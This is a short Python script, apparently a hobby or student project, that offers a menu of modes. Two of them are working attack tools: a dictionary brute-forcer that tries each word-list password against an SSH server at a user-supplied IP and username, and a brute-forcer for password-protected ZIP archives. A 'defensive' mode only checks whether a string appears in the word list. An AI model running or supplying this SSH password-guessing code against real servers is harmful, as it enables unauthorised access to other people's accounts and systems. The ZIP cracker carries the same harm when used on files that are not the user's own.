# Julian Pena
# Sources: https://www.youtube.com/watch?v=Sce8a6eABQc   https://github.com/Arszilla/BruteZIP  https://stackoverflow.com/questions/39172934/powershell-brute-forcing-password-protected-zip-file-speeding-up-the-process


import time
import paramiko
import zipfile

def offensive_mode(word_list_file):
    with open(word_list_file) as f:
        for word in f:
            print(word.strip())
            time.sleep(0.5)

def defensive_mode(search_string, word_list_file):
    with open(word_list_file) as f:
        if search_string in (line.strip() for line in f):
            print(f"The string '{search_string}' appeared in the word list.")
        else:
            print(f"The string '{search_string}' did not appear in the word list.")

def ssh_brute_force(ip, username, word_list_file):
    with open(word_list_file) as f:
        for word in f:
            password = word.strip()
            print(f"Trying password: {password}")
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password)
                print(f"Successful login with password: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                continue
    print("Failed to brute-force the SSH login.")

def zip_brute_force(zip_file, word_list_file):
    with zipfile.ZipFile(zip_file) as zf:
        with open(word_list_file) as f:
            for word in f:
                password = word.strip()
                try:
                    zf.extractall(pwd=password.encode())
                    print(f"Successful extraction with password: {password}")
                    return
                except (RuntimeError, zipfile.BadZipFile):
                    continue
    print("Failed to brute-force the ZIP file password.")

mode = input("Select mode (1: Offensive, 2: Defensive, 3: SSH Brute Force, 4: ZIP Brute Force): ")

if mode == '1':
    offensive_mode(input("Enter the path to the word list file: "))
elif mode == '2':
    search_string = input("Enter the string to search for: ")
    defensive_mode(search_string, input("Enter the path to the word list file: "))
elif mode == '3':
    ip = input("Enter the SSH server IP address: ")
    username = input("Enter the SSH username: ")
    ssh_brute_force(ip, username, input("Enter the path to the word list file: "))
elif mode == '4':
    zip_file = input("Enter the path to the ZIP file: ")
    zip_brute_force(zip_file, input("Enter the path to the word list file: "))
else:
    print("Invalid mode selection.")
